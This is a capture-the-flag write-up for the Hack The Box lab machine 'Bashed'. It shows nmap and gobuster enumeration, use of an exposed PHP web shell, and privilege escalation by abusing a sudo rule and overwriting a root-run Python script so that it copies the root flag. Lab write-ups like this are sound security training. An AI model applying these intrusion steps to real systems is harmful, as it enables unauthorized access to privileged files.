<center><h1>Bashed</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>
- Do some simple HTTP enumeration to find a custom php script
- Use the <b>phpbash.php</b> script grab user and root flag
<br>

First we start with an nmap scan
```
nmap -sV -sC -T4 -p- 10.10.10.68
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-16 15:48 EDT
Nmap scan report for 10.10.10.68
Host is up (0.053s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.28 seconds
```
<br>
Only one port this time. Navigating to the webpage we see a nice custom webpage. A quick look aorund does reveal anything obvious

<center><img src="/htb/bashed/home.png"></center>
<br>

Next step is to run a gobuster to enumerate the webpage better
```
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2019/09/16 15:58:33 Starting gobuster
===============================================================
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/config.php (Status: 200)
/fonts (Status: 301)
```
<br>
Quite a few options but the one that is interesting to us is the <b>/dev</b> directory. Navigating to the directory we will see two files.

<center><img src="/htb/bashed/dev.png"></center>
<br>
Doesnt matter which file you choose, both of them give you a custom bash shell written in php.

<center><img src="/htb/bashed/shell.png"></center>
<br>
At this point you can grab the user flag located in <b>/user/arrexel</b>.

Now time to get the root flag. Running a quick <b>sudo -l</b> we see that the we can run sudo asa the user <b>scriptmanager</b>.

```
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
<br>
Doing some basic enumeration around the box I noticed a strange directory name <b>/scripts</b> which is not there by default. A quick permissions check reveals that the directory is indeed owned by the user <b>scriptmanager</b>. Currently as the user <b>www-data</b> we can see there are two files in there but we are unable to read them. This is where we will use scriptmanagers sudo priviledges
```
www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.txt
testing 123!
```
Looking at both the files we can come to the conclusion that there is probably a process executing <b>test.py</b> and sending the output to <b>test.txt</b>.

What we are going to do is edit the <b>test.py</b> script to copy the contents of the root.txt file into the test.txt so we can then read it. This can be achieved with the short script below
```
f = open("test.txt", "w")
r = open("/root/root.txt", "r")
re = r.readline()
f.write(re)
```
Now we wait for the new file to execute and if you did everything correctly than you should be able to get the root flag by reading the <b>/scripts/test.txt</b> file.
<br><br><br>
